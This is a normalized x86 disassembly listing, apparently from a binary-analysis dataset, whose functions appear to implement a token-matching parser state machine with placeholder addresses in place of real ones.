call sub_10073b80
mov eax [ esi + 0xc ]
mov [ eax + 0x38 ] 0x1
xor ecx ecx
cmp eax 0x6f
sete cl
mov eax ecx
test eax eax
je r-xdata
push 0x4
mov eax ebx
call sub_10074190
add esp 0x4
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ esi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push esi
call sub_10048ae0
push 0x4c
push esi
call sub_1006ee90
mov edi r--data
mov ebx eax
push edi
push esi
mov [ ebx ] 0x0
call sub_1004c490
push r--data
push esi
mov [ ebx + 0x4 ] eax
call sub_1004c490
mov [ ebx + 0x10 ] eax
mov [ ebx + 0x8 ] edi
mov eax 0x4
mov [ ebx + 0xc ] eax
mov eax r--data
mov [ ebx + 0x14 ] eax
mov eax 0x7
mov [ ebx + 0x18 ] eax
mov edx [ r--data ]
mov [ ebx + 0x1c ] edx
mov eax [ r--data ]
mov [ ebx + 0x20 ] eax
mov ecx [ r--data ]
mov [ ebx + 0x24 ] ecx
mov edx [ r--data ]
mov [ ebx + 0x28 ] edx
mov eax [ r--data ]
mov [ ebx + 0x2c ] eax
mov ecx [ r--data ]
mov [ ebx + 0x30 ] ecx
mov edx [ r--data ]
mov [ ebx + 0x34 ] edx
mov eax [ r--data ]
mov [ ebx + 0x38 ] eax
mov ecx [ r--data ]
mov [ ebx + 0x3c ] ecx
mov edx [ r--data ]
mov [ ebx + 0x40 ] edx
mov edx [ ebp - 0x4 ]
mov eax [ r--data ]
add edx 0x4c
push edx
mov [ ebx + 0x44 ] eax
mov ecx [ r--data ]
push ebx
push esi
mov [ ebx + 0x48 ] ecx
call sub_10046530
mov eax esi
call sub_10073b80
mov eax esi
call sub_10073b80
push 0x1a
mov eax 0x20
mov ecx esi
call sub_10073fd0
add esp 0x30
mov eax esi
call sub_10073b80
mov eax esi
call sub_10073b80
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ edi ]
mov eax [ edx + ebx * 4 ]
cmp eax [ ebp + 0x8 ]
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x8 ]
mov ecx [ eax + edi * 4 ]
cmp [ ecx + 0x20 ] 0x0
mov [ ebp + 0xc ] ecx
jne r-xdata
mov edx ebx
cmp [ edx + 0x28 ] 0x0
je r-xdata
push esi
call sub_10074310
mov edi ebx
mov ebx esi
call sub_10073f90
push esi
call sub_100733d0
mov esi [ esi + 0xc ]
mov eax [ esi ]
add esp 0x8
cmp eax 0x8
je r-xdata
mov edx [ edi ]
mov [ edx + ebx * 4 ] 0x0
inc ebx
cmp ebx [ edi + 0x4 ]
jb r-xdata
cmp eax [ ebp + 0xc ]
je r-xdata
sub eax edx
push edi
push esi
mov ebx eax
call sub_1004af10
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x10 ]
push edx
push esi
call sub_1004c490
mov [ edi ] eax
mov eax [ ebp + 0x8 ]
mov [ edi + 0x4 ] ebx
push eax
inc ebx
push esi
mov [ edi + 0x8 ] ebx
call sub_10055ac0
add esp 0x18
jmp r-xdata
call sub_10074ad0
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov eax ecx
call sub_10073830
add esp 0x4
test eax eax
jne r-xdata
pop edi
mov [ esi ] 0x10
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
cmp eax 0xa
je r-xdata
cmp eax [ ebp - 0xc ]
je r-xdata
push 0x6d
mov eax 0x20
mov ecx esi
call sub_10073fd0
mov edi [ ebp - 0x10 ]
xor ebx ebx
add esp 0x4
mov [ ebp - 0x4 ] eax
cmp [ edi + 0x4 ] ebx
jbe r-xdata
dec edi
jns r-xdata
mov edi edx
call sub_100748b0
mov edi [ ebp + 0xc ]
cmp eax 0xc
je r-xdata
mov ecx [ ebp - 0x4 ]
add ecx 0x4c
push ecx
push eax
push esi
call sub_10046530
add esp 0xc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_10073b80
cmp edi eax
jne r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
cmp eax 0xd
je r-xdata
cmp eax 0xe
je r-xdata
pop edi
mov [ esi ] 0xf
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
sub_10077100
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0xc ]
mov eax [ edi ]
cmp eax 0x5
je r-xdata
mov eax [ ebp + 0x8 ]
mov esi [ eax + 0xc ]
add esi 0x48
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp eax 0x4
je r-xdata
mov edx [ edi + 0x18 ]
push esi
push edx
push eax
call sub_1004c3a0
add esp 0xc
cmp [ edi ] 0x5
jne r-xdata
mov edx [ edi + 0x10 ]
mov [ esi + 0xc ] edx
mov ecx [ edi + 0x4 ]
mov [ esi + 0x10 ] ecx
mov edx [ edi + 0x8 ]
mov [ esi + 0x14 ] edx
mov ecx [ edi + 0xc ]
mov [ esi + 0x18 ] ecx
mov esi [ ebp + 0x8 ]
cmp eax 0x7
jne r-xdata
mov eax [ edi + 0x18 ]
push eax
push r--data
call sub_10020200
add esp 0x8
pop edi
mov eax 0x1
pop esi
pop ebp
retn
mov [ esi + 0x1c ] 0x2
mov eax esi
call sub_10073b80
mov esi [ esi + 0xc ]
mov ecx [ esi + 0x4 ]
pop edi
mov [ esi ] ecx
mov eax 0x1
pop esi
pop ebp
retn
push esi
mov eax edi
call sub_100736d0
mov eax [ esi + 0xc ]
add esp 0x4
mov [ eax + 0x34 ] 0x1
sub_100771b0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebx ]
push edi
mov edi [ ebp + 0x8 ]
mov ecx [ edi + 0xc ]
mov [ ebp - 0x4 ] ecx
cmp esi 0x5
je r-xdata
mov edx [ ecx ]
mov eax 0x1
mov [ ecx + 0x4 ] edx
mov [ ecx + 0x34 ] eax
mov ecx [ edi + 0xc ]
pop edi
pop esi
mov [ ecx ] 0x9
pop ebx
mov esp ebp
pop ebp
retn
cmp esi 0x4
je r-xdata
test esi esi
jne r-xdata
cmp esi 0x3
jne r-xdata
push edi
mov eax ebx
call sub_100736d0
mov eax [ edi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push edi
call sub_10048ae0
add esp 0xc
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
cmp esi 0x1
jne r-xdata
mov eax [ ecx + 0xc ]
test eax eax
je r-xdata
push 0x96
push 0x66
push 0x68
push 0x67
push 0x64
push 0x65
push 0x63
push 0x1
mov eax ebx
call sub_10073790
add esp 0x20
test eax eax
je r-xdata
mov eax [ ebx + 0x18 ]
xor ecx ecx
cmp eax 0x60
sete cl
test ecx ecx
je r-xdata
mov esi ebx
mov ebx eax
mov eax edi
call sub_10073c60
mov edx [ ecx + 0x8 ]
mov eax [ edx + eax * 4 - 0x4 ]
mov ecx 0x5f
cmp esi 0x1
jne r-xdata
mov esi edi
call sub_10073d20
mov eax [ edi + 0xc ]
push 0x96
push 0x66
push 0x68
mov [ eax ] 0xc
push 0x67
push 0x1
mov eax ebx
call sub_10073790
add esp 0x14
test eax eax
je r-xdata
xor ecx ecx
cmp eax 0x61
sete cl
test ecx ecx
je r-xdata
mov esi edi
call sub_10073d20
mov ebx r--data
call sub_100742a0
mov edi [ ebp + 0xc ]
mov ebx esi
call sub_10073f90
mov eax [ ebx + 0xc ]
pop edi
pop esi
mov [ eax ] 0xa
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
cmp esi 0x2
jne r-xdata
xor eax eax
cmp [ ebx + 0x18 ] ecx
sete al
test eax eax
je r-xdata
mov edi ebx
mov ebx esi
call sub_10073f90
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
push 0x63
mov eax 0x8
mov ecx edi
call sub_10073fd0
mov ecx [ ebp - 0x4 ]
add esp 0x4
pop edi
pop esi
mov [ ecx + 0x34 ] 0x1
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
xor edx edx
cmp eax 0x62
sete dl
mov eax edx
test eax eax
je r-xdata
mov esi edi
call sub_10073d20
mov edi ebx
mov ebx esi
call sub_10073f90
mov ecx [ ebx + 0xc ]
pop edi
pop esi
mov [ ecx ] 0xb
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
push 0x96
push 0x66
push 0x64
push 0x68
push 0x65
push 0x67
push 0x63
push 0x0
push 0x61
push 0x62
push 0x60
push 0xa
push 0x0
mov eax ebx
call sub_10073790
add esp 0x34
test eax eax
mov eax ebx
je r-xdata
xor eax eax
cmp [ ebx + 0x18 ] ecx
sete al
test eax eax
je r-xdata
push edi
mov eax ebx
call sub_100736d0
add esp 0x4
mov esi edi
call sub_10074930
test eax eax
je r-xdata
mov esi edi
call sub_10073d20
push 0x61
mov eax 0x8
mov ecx edi
call sub_10073fd0
mov ecx [ edi + 0xc ]
add esp 0x4
mov eax 0x1
mov [ ecx + 0x34 ] eax
mov edx [ edi + 0xc ]
pop edi
pop esi
mov [ edx ] 0xb
pop ebx
mov esp ebp
pop ebp
retn
push 0x96
push 0x7
push 0x6
push 0x1
call sub_10073790
add esp 0x10
test eax eax
je r-xdata
push edi
call sub_100736d0
mov edx [ edi + 0xc ]
mov eax [ edx + 0x68 ]
push eax
push edi
call sub_10048ae0
add esp 0xc
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov esi edi
call sub_10074930
mov eax [ edi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push edi
call sub_10048ae0
add esp 0x8
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ edi + 0xc ]
pop edi
pop esi
mov [ edx + 0x34 ] 0x1
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
cmp esi 0x1
jne r-xdata
push ebx
push edi
call sub_100759d0
add esp 0x8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
push edi
mov eax ebx
call sub_100736d0
add esp 0x4
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
cmp esi 0x7
jne r-xdata
xor eax eax
cmp [ ebx + 0x18 ] 0x6d
sete al
test eax eax
je r-xdata
push edi
mov eax ebx
call sub_100736d0
mov esi [ ebp - 0x4 ]
push ebx
push edi
mov [ esi + 0x44 ] 0x1
call sub_10075d00
add esp 0xc
pop edi
mov [ esi + 0x44 ] 0x0
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x0
mov eax edi
call sub_100734d0
call sub_10073830
add esp 0x4
jmp r-xdata
mov esi [ ebx ]
cmp esi 0x1
jne r-xdata
push r--data
lea ecx [ ebx + 0x1c ]
mov eax r--data
call sub_10073320
add esp 0x4
test eax eax
je r-xdata
test eax eax
jne r-xdata
xor eax eax
cmp [ ebx + 0x18 ] 0x69
sete al
test eax eax
je r-xdata
push edi
mov eax ebx
call sub_100736d0
mov edi ebx
mov ebx [ ebp + 0x8 ]
add esp 0x4
call sub_10073f90
mov eax ebx
call sub_10073b80
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
push edi
mov eax ebx
call sub_100736d0
mov ecx [ ebp - 0x4 ]
add esp 0x4
cmp [ ecx + 0x30 ] 0x0
je r-xdata
mov edi ebx
mov ebx [ ebp + 0x8 ]
call sub_10073f90
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x30 ] eax
mov eax ebx
call sub_10073b80
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ edi + 0xc ]
mov eax [ edx + 0x68 ]
push eax
push edi
call sub_10048ae0
add esp 0x8
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
sub_10077580
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
push esi
cmp ecx 0x6
jne r-xdata
push edi
cmp ecx 0x5
je r-xdata
mov esi [ ebp + 0x8 ]
push esi
call sub_100736d0
mov eax [ esi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push esi
call sub_10048ae0
add esp 0xc
xor eax eax
pop esi
pop ebp
retn
mov edi eax
mov eax [ ebp + 0x8 ]
call sub_10074130
pop edi
mov eax 0x1
pop esi
pop ebp
retn
cmp ecx 0x4
je r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
mov esi [ ebx + 0xc ]
xor edi edi
cmp [ esi + 0x4c ] edi
jbe r-xdata
mov edi ebx
call sub_10073a20
mov edx [ esi + 0x4 ]
pop ebx
mov eax 0x1
pop edi
mov [ esi + 0x44 ] 0x0
mov [ esi + 0x34 ] eax
mov [ esi ] edx
pop esi
pop ebp
retn
mov edx [ esi + 0x48 ]
movsx eax [ edx + edi ]
push eax
call sub_1005af1f
add esp 0x4
test eax eax
je r-xdata
push ebx
mov [ esi + 0x44 ] 0x1
call sub_10074310
add esp 0x4
mov ecx [ esi + 0x48 ]
cmp [ edi + ecx ] 0xb
je r-xdata
inc edi
cmp edi [ esi + 0x4c ]
jb r-xdata
jmp r-xdata
sub_10077630
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov ebx [ ebp + 0xc ]
push edi
push 0x96
push 0x66
push 0x64
push 0x68
push 0x65
push 0x67
push 0x63
push 0x61
push 0x62
mov edi 0x60
push edi
mov esi 0x1
push esi
mov eax ebx
call sub_10073790
add esp 0x2c
test eax eax
jne r-xdata
push 0x96
push 0x5f
push 0x0
push 0x0
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] esi
mov esi [ ebp + 0x8 ]
push ecx
lea eax [ ebp - 0x4 ]
push esi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x10 ] eax
call sub_10074530
add esp 0x18
test eax eax
jne r-xdata
push 0x96
push 0x5f
push edi
push eax
mov eax ebx
call sub_10073790
add esp 0x10
test eax eax
jne r-xdata
cmp [ ebx ] 0x2
jne r-xdata
push esi
mov eax ebx
call sub_100736d0
mov edx [ esi + 0xc ]
mov eax [ edx + 0x68 ]
push eax
push esi
call sub_10048ae0
add esp 0xc
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
push 0x96
push 0x66
push 0x64
push 0x68
push 0x65
push 0x67
push 0x63
push eax
push 0x61
push 0x62
push 0xa
push eax
mov eax ebx
call sub_10073790
add esp 0x30
test eax eax
je r-xdata
push esi
mov eax ebx
call sub_100736d0
mov ecx [ esi + 0xc ]
add esp 0x4
mov [ ecx + 0x34 ] 0x1
xor eax eax
cmp [ ebx + 0x18 ] edi
sete al
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
push ebx
push edx
call sub_10075d00
add esp 0x8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ ebp + 0x8 ]
push esi
mov eax ebx
call sub_100736d0
mov eax [ esi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push esi
call sub_10048ae0
add esp 0xc
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ecx ] edi
jne r-xdata
mov edx [ eax + 0x8 ]
mov ecx [ edx + ecx * 4 - 0x4 ]
mov edi 0x96
call sub_100748b0
mov eax [ esi + 0xc ]
mov ecx [ eax + 0xc ]
mov edi 0x1
test ecx ecx
je r-xdata
push esi
mov eax ebx
call sub_100736d0
add esp 0x4
push 0x60
mov eax esi
call sub_100734d0
call sub_10073830
add esp 0x4
test eax eax
jne r-xdata
cmp [ ecx + 0x1c ] 0x60
je r-xdata
xor edi edi
mov eax esi
call sub_10073b80
push 0x60
mov eax esi
call sub_100734d0
call sub_10073830
add esp 0x4
test eax eax
je r-xdata
mov eax esi
call sub_10073b80
mov ebx esi
call sub_10074420
mov eax [ esi + 0xc ]
mov [ eax ] 0x8
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_100777e0
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0xc ]
mov edx [ edi ]
cmp edx 0x4
jne r-xdata
push esi
test edx edx
jne r-xdata
mov eax [ ebp + 0x8 ]
call sub_10074130
mov eax 0x1
pop edi
pop ebp
retn
push ebx
cmp edx 0x3
jne r-xdata
mov esi [ ebp + 0x8 ]
push esi
mov eax edi
call sub_100736d0
mov eax [ esi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push esi
call sub_10048ae0
add esp 0xc
pop esi
xor eax eax
pop edi
pop ebp
retn
mov esi 0x1
cmp edx esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xc ]
mov edx [ ecx + 0xc ]
test edx edx
jne r-xdata
cmp edx 0x2
jne r-xdata
mov eax [ edi + 0x18 ]
xor ecx ecx
test eax eax
sete cl
test ecx ecx
je r-xdata
mov ecx [ ecx + 0x8 ]
mov edx [ ecx + edx * 4 - 0x4 ]
mov esi edi
mov ebx edx
call sub_10073c60
pop ebx
pop esi
mov eax 0x1
pop edi
pop ebp
retn
mov esi edi
mov ebx edx
call sub_10073c60
lea eax [ ebx + 0x1 ]
pop ebx
pop esi
pop edi
pop ebp
retn
mov ebx [ ebp + 0x8 ]
cmp edx 0x7
jne r-xdata
xor eax eax
cmp [ edi + 0x18 ] 0x62
sete al
test eax eax
je r-xdata
xor ecx ecx
cmp eax 0x62
sete cl
mov eax ecx
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edi
push edx
call sub_10075d00
add esp 0x8
pop ebx
pop esi
pop edi
pop ebp
retn
mov eax ebx
call sub_100734d0
mov ecx [ ebx + 0x4 ]
cmp eax [ ecx + 0x4 ]
jne r-xdata
mov eax ebx
call sub_100734d0
mov edx [ ebx + 0x4 ]
cmp eax [ edx + 0x4 ]
je r-xdata
mov esi [ ebp + 0x8 ]
push esi
mov eax edi
call sub_100736d0
mov eax [ esi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push esi
call sub_10048ae0
add esp 0xc
pop ebx
pop esi
xor eax eax
pop edi
pop ebp
retn
mov ebx [ ebp + 0x8 ]
call sub_10073f90
mov eax ebx
call sub_10073b80
mov edx [ ebx + 0xc ]
pop ebx
mov [ edx + 0x38 ] esi
mov eax esi
pop esi
pop edi
pop ebp
retn
mov eax ebx
call sub_10073b80
mov edx [ ebx + 0xc ]
mov [ edx ] 0x8
cmp [ edi ] 0x2
jne r-xdata
push ebx
mov eax edi
call sub_100736d0
add esp 0x4
pop ebx
pop esi
xor eax eax
pop edi
pop ebp
retn
pop ebx
mov eax esi
pop esi
pop edi
pop ebp
retn
mov eax [ ebx + 0xc ]
mov [ eax + 0x34 ] esi
xor eax eax
cmp [ edi + 0x18 ] 0x61
sete al
test eax eax
jne r-xdata
sub_10077950
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov ebx [ edi ]
mov esi 0x1
cmp ebx esi
jne r-xdata
push 0x96
push 0x68
push 0x67
push esi
mov eax edi
call sub_10073790
add esp 0x10
test eax eax
mov eax edi
je r-xdata
xor eax eax
cmp [ edi + 0x18 ] 0x66
sete al
test eax eax
je r-xdata
push 0x96
push 0x64
push 0x65
push 0x63
push 0x0
call sub_10073790
add esp 0x14
test eax eax
je r-xdata
mov ebx [ ebp + 0x8 ]
push ebx
call sub_100736d0
push ebx
call sub_10053470
push 0x66
call sub_10073d70
mov edi eax
or [ edi + 0xc ] 0x9
push 0x0
mov ecx ebx
call sub_10073ee0
add esp 0x10
push edi
push 0x66
call sub_10068a50
add esp 0x4
push eax
push r--data
call sub_10020200
mov edx [ ebx + 0xc ]
add esp 0xc
mov [ edx + 0x34 ] esi
mov eax [ ebx + 0xc ]
pop edi
pop esi
mov [ eax ] 0xd
xor eax eax
pop ebx
pop ebp
retn
mov ebx [ ebp + 0x8 ]
push ebx
call sub_10053470
push 0x0
push ebx
call sub_10073e20
push 0x0
mov ecx ebx
mov edi eax
call sub_10073ee0
mov eax [ edi + 0x1c ]
add esp 0x10
push edi
push eax
call sub_10068a50
add esp 0x4
push eax
push r--data
call sub_10020200
mov ecx [ ebx + 0xc ]
add esp 0xc
pop edi
mov eax esi
pop esi
mov [ ecx ] 0xd
pop ebx
pop ebp
retn
push 0x96
push 0x64
push 0x65
push 0x63
push 0x61
push 0x62
push 0x60
push esi
mov eax edi
call sub_10073790
add esp 0x20
test eax eax
jne r-xdata
mov ebx [ ebp + 0x8 ]
mov eax [ edi + 0x18 ]
push ebx
call sub_10074830
add esp 0x4
push ebx
test eax eax
je r-xdata
mov ebx [ ebp + 0x8 ]
push ebx
mov eax 0x63
call sub_10074830
add esp 0x4
test eax eax
jne r-xdata
cmp ebx 0x2
jne r-xdata
mov eax edi
call sub_100736d0
mov ecx [ ebx + 0xc ]
mov edx [ ecx + 0x68 ]
push edx
push ebx
call sub_10048ae0
add esp 0xc
pop edi
pop esi
xor eax eax
pop ebx
pop ebp
retn
call sub_10053470
add esp 0x4
mov eax ebx
call sub_10073b80
mov eax [ ebx + 0xc ]
pop edi
mov [ eax ] 0x8
mov eax esi
pop esi
pop ebx
pop ebp
retn
push ebx
call sub_10053470
add esp 0x4
mov eax ebx
call sub_10073b80
mov eax [ ebx + 0xc ]
mov [ eax ] 0x8
mov ecx [ ebx + 0xc ]
pop edi
mov [ ecx + 0x34 ] esi
mov eax esi
pop esi
pop ebx
pop ebp
retn
push ebx
mov eax 0x64
call sub_10074830
add esp 0x4
test eax eax
jne r-xdata
push 0x96
push 0x68
push 0x67
push 0x0
push 0x61
push 0x66
push 0x62
push 0x60
push 0xa
push 0x0
mov eax edi
call sub_10073790
add esp 0x28
test eax eax
je r-xdata
cmp [ edi + 0x18 ] 0x5f
sete al
test eax eax
jne r-xdata
push ebx
mov eax 0x65
call sub_10074830
add esp 0x4
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push edi
push eax
call sub_100771b0
add esp 0x8
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ ebp + 0x8 ]
push esi
mov eax edi
call sub_100736d0
mov ecx [ esi + 0xc ]
mov edx [ ecx + 0x68 ]
push edx
push esi
call sub_10048ae0
add esp 0xc
pop edi
pop esi
xor eax eax
pop ebx
pop ebp
retn
push ebx
sub_10077b90
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
push 0x96
push 0x67
push 0x68
mov ebx 0x1
push ebx
mov eax edi
call sub_10073790
add esp 0x10
test eax eax
je r-xdata
push 0x96
push 0x66
push 0x64
push 0x65
push 0x63
push 0x61
push 0x60
push ebx
mov eax edi
call sub_10073790
add esp 0x20
test eax eax
jne r-xdata
mov esi [ ebp + 0x8 ]
call sub_10073cd0
push 0x0
push esi
call sub_10073e20
push 0x0
mov ecx esi
mov edi eax
call sub_10073ee0
mov eax [ edi + 0x1c ]
add esp 0xc
push edi
push eax
call sub_10068a50
add esp 0x4
push eax
push r--data
call sub_10020200
mov ecx [ esi + 0xc ]
add esp 0xc
mov ebx r--data
mov edi esi
mov [ ecx ] 0xe
call sub_100742a0
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
push 0x96
push 0x64
push 0x65
push 0x63
push 0x0
mov eax edi
call sub_10073790
add esp 0x14
test eax eax
je r-xdata
push 0x96
push 0x64
push 0x65
push 0x63
push 0x5f
push 0x66
push eax
mov eax edi
call sub_10073790
add esp 0x1c
test eax eax
jne r-xdata
mov esi 0x66
mov esi [ edi + 0x18 ]
jmp r-xdata
push 0x96
push 0x68
push 0x67
push eax
push 0x61
push 0x62
push 0x60
push 0xa
push eax
mov eax edi
call sub_10073790
add esp 0x24
test eax eax
je r-xdata
mov esi ebx
call sub_10073cd0
mov eax ebx
call sub_10073b80
mov edx [ ebx + 0xc ]
mov [ edx ] 0xc
cmp [ edi ] 0x2
jne r-xdata
push esi
call sub_10068a50
push eax
push r--data
call sub_10020200
mov eax [ ebx + 0xc ]
xor esi esi
add esp 0xc
cmp [ eax + 0xc ] esi
jbe r-xdata
push 0x96
push 0x5f
push 0x0
push 0x0
lea eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
mov ebx [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x4 ]
push ebx
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x10 ] edx
call sub_10074530
add esp 0x18
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
push edi
push ecx
call sub_100771b0
add esp 0x8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ ebp + 0x8 ]
push esi
mov eax edi
call sub_100736d0
mov edx [ esi + 0xc ]
mov eax [ edx + 0x68 ]
push eax
push esi
call sub_10048ae0
add esp 0xc
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx + 0xc ]
mov [ eax + 0x34 ] 0x1
xor eax eax
cmp [ edi + 0x18 ] 0x66
sete al
test eax eax
jne r-xdata
push ebx
mov eax edi
call sub_100736d0
mov eax [ ebx + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push ebx
call sub_10048ae0
add esp 0xc
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
jmp r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ eax + 0x8 ]
mov eax [ ecx + esi * 4 ]
mov edx [ eax + 0x1c ]
push edx
call sub_10068a50
push eax
push r--data
call sub_10020200
mov eax [ ebx + 0xc ]
inc esi
add esp 0xc
cmp esi [ eax + 0xc ]
jb r-xdata
sub_10077db0
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
push 0x96
push 0x68
push 0x67
push 0x0
mov eax edi
call sub_10073790
add esp 0x10
mov ebx 0x1
push 0x96
test eax eax
je r-xdata
push 0x66
push 0x64
push 0x68
push 0x65
push 0x67
push 0x63
push 0x61
push 0x62
push 0x60
push ebx
mov eax edi
call sub_10073790
add esp 0x2c
test eax eax
je r-xdata
mov esi [ edi + 0x18 ]
push 0x5f
push 0x0
push 0x0
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
mov ebx [ ebp + 0x8 ]
push ecx
lea eax [ ebp - 0x4 ]
push ebx
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x10 ] eax
call sub_10074530
add esp 0x18
test eax eax
jne r-xdata
push 0x96
push 0x0
push 0x61
push 0x62
push 0x60
push 0xa
push 0x0
mov eax edi
call sub_10073790
add esp 0x1c
test eax eax
mov eax edi
je r-xdata
push r--data
call sub_10020200
mov esi [ ebp + 0x8 ]
push 0x96
push 0x5f
push 0x0
push 0x0
lea eax [ ebp - 0x10 ]
push eax
lea edx [ ebp - 0x4 ]
push esi
mov [ ebp - 0x4 ] 0x68
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
call sub_10074530
add esp 0x1c
test eax eax
jne r-xdata
push edi
mov eax esi
mov ecx ebx
call sub_100749a0
add esp 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebx
mov eax edi
call sub_100736d0
add esp 0x4
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
push 0x96
push 0x66
push 0x64
push 0x65
push 0x63
push 0x5f
push 0x0
call sub_10073790
add esp 0x1c
test eax eax
je r-xdata
mov esi [ ebp + 0x8 ]
push esi
call sub_100736d0
mov eax [ esi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push esi
call sub_10048ae0
add esp 0xc
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ esi + 0xc ]
mov [ edx + 0x34 ] ebx
call sub_10074a50
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x96
push 0x5f
push eax
push eax
lea edx [ ebp - 0x10 ]
push edx
lea ecx [ ebp - 0x4 ]
push esi
mov [ ebp - 0x4 ] 0x67
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
call sub_10074530
add esp 0x18
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
push edi
push edx
call sub_10075d00
add esp 0x8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ ebp + 0x8 ]
mov eax [ edi + 0x18 ]
push esi
call sub_10074830
add esp 0x4
test eax eax
jne r-xdata
push r--data
call sub_10020200
push esi
mov eax edi
call sub_100736d0
mov eax [ esi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push esi
call sub_10048ae0
add esp 0x10
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ esi + 0xc ]
mov [ ecx + 0x34 ] ebx
call sub_10074a50
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push esi
mov eax edi
call sub_100736d0
mov edx [ esi + 0xc ]
mov eax [ edx + 0x68 ]
push eax
push esi
call sub_10048ae0
add esp 0xc
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
sub_10077fc0
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ esi ]
cmp edi 0x6
jne r-xdata
cmp edi 0x5
je r-xdata
mov edi [ ebp + 0x8 ]
push edi
mov eax esi
call sub_100736d0
mov eax [ edi + 0xc ]
